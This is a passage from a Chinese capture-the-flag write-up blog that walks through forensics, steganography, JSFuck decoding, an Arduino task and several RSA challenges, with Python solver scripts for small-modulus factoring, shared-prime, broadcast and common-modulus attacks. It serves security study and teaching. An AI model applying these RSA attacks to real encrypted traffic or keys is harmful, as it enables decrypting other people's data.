id="3、好康的流量"><a href="#3、好康的流量" class="headerlink" title="3、好康的流量"></a>3、好康的流量</h2><p><img src="https://img-blog.csdnimg.cn/77d7146c9eea4a7cae4343c11bf7b3f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一个pcap文件，丢入wireshark<br>[文件]-&gt;[导出对象]-&gt;[IMF]<br>至于为什么是IMF，是试出来的，只有IMF有一个可以导出对象<br><img src="https://img-blog.csdnimg.cn/3c2ec6da552e4f359cb6148d1b94fb8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拿到了一张图片<br><img src="https://img-blog.csdnimg.cn/b9222a0bb7634f19af93797de5e08594.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b47c0ad5244146919100d04e5ac6e2cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢入stegsolve，更改颜色通道<br><img src="https://img-blog.csdnimg.cn/3e5c4db5d8fc4a4192aac6874e152aa8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一张条形码<br><a href="https://online-barcode-reader.inliteresearch.com/">条形码在线解密网站</a><br><img src="https://img-blog.csdnimg.cn/68d0c3954fce4ddf9d2b89708e75e422.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到一般flag，另一半呢？</p><hr><h2 id="4、Tetris-plus"><a href="#4、Tetris-plus" class="headerlink" title="4、Tetris plus"></a>4、Tetris plus</h2><p><img src="https://img-blog.csdnimg.cn/4834e247feb1488ab8abfacefc5b70ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/27e000da1c69499ea492a0d79a78ee73.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>玩到三千分会出现一个dialog“flag 貌似被藏起来了，再找找吧!”<br>要自己找<br><img src="https://img-blog.csdnimg.cn/d4ff8c4d46844a3fa65b75918df006af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到了base64加密的“flag 貌似被藏起来了，再找找吧!”<br>下面有一串jsfuck加密的字符串，解密<br><img src="https://img-blog.csdnimg.cn/7e02bbc201024b629f814c0b305dc437.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>（我发现不同在线工具解密出来不一样，多试几次）<br><a href="http://www.liminba.com/tool/jsfuckdecode/">jsfuck解密</a><br>再次解密<br><img src="https://img-blog.csdnimg.cn/3b794705b99d434490f9c22aa06a5063.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到flag</p><hr><h2 id="5、饭卡的uno"><a href="#5、饭卡的uno" class="headerlink" title="5、饭卡的uno"></a>5、饭卡的uno</h2><p>Iot物联网的题目，和硬件相关<br><img src="https://img-blog.csdnimg.cn/25d7dbf39a8b42119d2bdff264373e97.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开附件<br><img src="https://img-blog.csdnimg.cn/dbf27cc08fcf47a5b74f066d379adf54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://club.gizwits.com/thread-6962-1-1.html">给Arduino上传HEX文件</a><br><a href="https://0xdf.gitlab.io/hackvent2019/leet">好像是个外国人写的跟着题类似的wp</a></p><hr><h2 id="6、RSA-Attack"><a href="#6、RSA-Attack" class="headerlink" title="6、RSA Attack"></a>6、RSA Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">700612512827159827368074182577656505408114629807</span><br>c = <span class="hljs-number">122622425510870177715177368049049966519567512708</span><br><br><span class="hljs-comment">#在线分解工具，分解n</span><br>p= <span class="hljs-number">715800347513314032483037</span><br>q= <span class="hljs-number">978782023871716954857211</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><hr><h2 id="7、RSA-Attack2"><a href="#7、RSA-Attack2" class="headerlink" title="7、RSA Attack2"></a>7、RSA Attack2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#题目</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> s2n<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>flag_parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(s2n, re.findall(<span class="hljs-string">rf&quot;.&#123;&#123;,<span class="hljs-subst">&#123;ceil(<span class="hljs-built_in">len</span>(flag) / <span class="hljs-number">3</span>)&#125;</span>&#125;&#125;&quot;</span>, flag)))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# task1&quot;</span>)<br>m = flag_parts[<span class="hljs-number">0</span>]<br>e = <span class="hljs-number">65537</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>r = getPrime(<span class="hljs-number">1024</span>)<br>n1 = p * q<br>c1 = <span class="hljs-built_in">pow</span>(m, e, n1)<br>n2 = r * q<br>c2 = <span class="hljs-built_in">pow</span>(m, e, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n1 =&quot;</span>, n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 =&quot;</span>, c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n2 =&quot;</span>, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 =&quot;</span>, c2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# task2&quot;</span>)<br>m = flag_parts[<span class="hljs-number">1</span>]<br>e = <span class="hljs-number">7</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# task3&quot;</span>)<br>m = flag_parts[<span class="hljs-number">2</span>]<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e1 = getPrime(<span class="hljs-number">32</span>)<br>e2 = getPrime(<span class="hljs-number">32</span>)<br>c1 = <span class="hljs-built_in">pow</span>(m, e1, n)<br>c2 = <span class="hljs-built_in">pow</span>(m, e2, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e1 =&quot;</span>, e1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 =&quot;</span>, c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e2 =&quot;</span>, e2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 =&quot;</span>, c2)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8443b0e76752499bb356213b9ebe30a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#task1 N不互素（共享素数）</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>e = <span class="hljs-number">65537</span><br>n1 = <br>c1 = <br>n2 = <br>c2 = <br><br><span class="hljs-comment">#求最大公约数</span><br>q=gmpy2.gcd(n1,n2)<br>p1=n1//q<br><br>phi_n=(q-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>)<br><span class="hljs-comment">#求逆元d</span><br>d1=libnum.invmod(e,phi_n)<br>m=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-comment">#数字转字节，转字符串</span><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode())<br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13406617?spm_id_from=333.999.0.0">低加密指数广播攻击指路脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#task2 低加密指数广播攻击</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert, gcd, iroot<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">op</span>(<span class="hljs-params">x</span>):</span><br>    res = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>        res *= i<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CRT</span>(<span class="hljs-params">m, a</span>):</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">len</span>(m) == <span class="hljs-built_in">len</span>(a))<br>    M = op(m)<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(m, a):<br>        Mi = M // m<br>        ti = invert(Mi, m)<br>        <span class="hljs-built_in">sum</span> += a * ti * Mi<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span> % M<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GCRT</span>(<span class="hljs-params">m, a</span>):</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">len</span>(m) == <span class="hljs-built_in">len</span>(a))<br>    curm, cura = m[<span class="hljs-number">0</span>], a[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> m, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(m[<span class="hljs-number">1</span>:], a[<span class="hljs-number">1</span>:]):<br>        d = gcd(curm, m)<br>        c = a - cura<br>        <span class="hljs-keyword">assert</span> (c % d == <span class="hljs-number">0</span>)<br>        K = c // d * invert(curm // d, m // d)<br>        cura += curm * K<br>        curm = curm * m // d<br>    <span class="hljs-keyword">return</span> cura % curm<br><br>e = <span class="hljs-number">7</span><br>n = []<br>c = []<br>m = CRT(n, c)<br>m1 = iroot(m, e)  <span class="hljs-comment"># 开e次方</span><br><span class="hljs-built_in">print</span>(m1)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m1[<span class="hljs-number">0</span>])))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#task3  共模攻击脚本</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#数字n、c1、c2都太长了，我直接去了</span><br>n=<br>e1= <span class="hljs-number">2519901323</span><br>e2= <span class="hljs-number">3676335737</span><br>c1=<br>c2=<br>gcd, s, t = gmpy2.gcdext(e1, e2)<br><span class="hljs-comment">#广义欧几里得求出s,t  gcdext返回值为e1,e2最大公因数和s、t。 s*e1+t*e2=(e1,e2)</span><br><br><span class="hljs-comment">#s和t中必然有一位负数，将其变为正数，要使等式仍然成立，取逆元</span><br><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:<br>    s = -s<br>    c1 = gmpy2.invert(c1, n)<br><span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>    t = -t<br>    c2 = gmpy2.invert(c2, n)<br>plain = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(plain))<br></code></pre></td></tr></table></figure><hr><h2 id="8、"><a href="#8、" class="headerlink" title="8、"></a>8、</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、Easy-RSA&quot;&gt;&lt;a href=&quot;#1、Easy-RSA&quot; class=&quot;headerlink&quot; title=&quot;1、Easy RSA&quot;&gt;&lt;/a&gt;1、Easy RSA&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
